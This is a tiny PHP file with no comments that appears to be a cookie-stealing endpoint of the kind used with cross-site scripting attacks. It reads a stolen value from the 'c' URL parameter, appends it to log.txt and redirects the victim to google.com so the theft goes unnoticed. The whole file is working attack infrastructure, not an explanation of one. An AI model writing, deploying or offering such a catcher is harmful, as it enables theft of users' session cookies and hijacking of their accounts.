<?php
$cookie = $_GET['c'];
$file = fopen('log.txt', 'a');
fwrite($file, $cookie);

Header('Location: https://google.com');
?>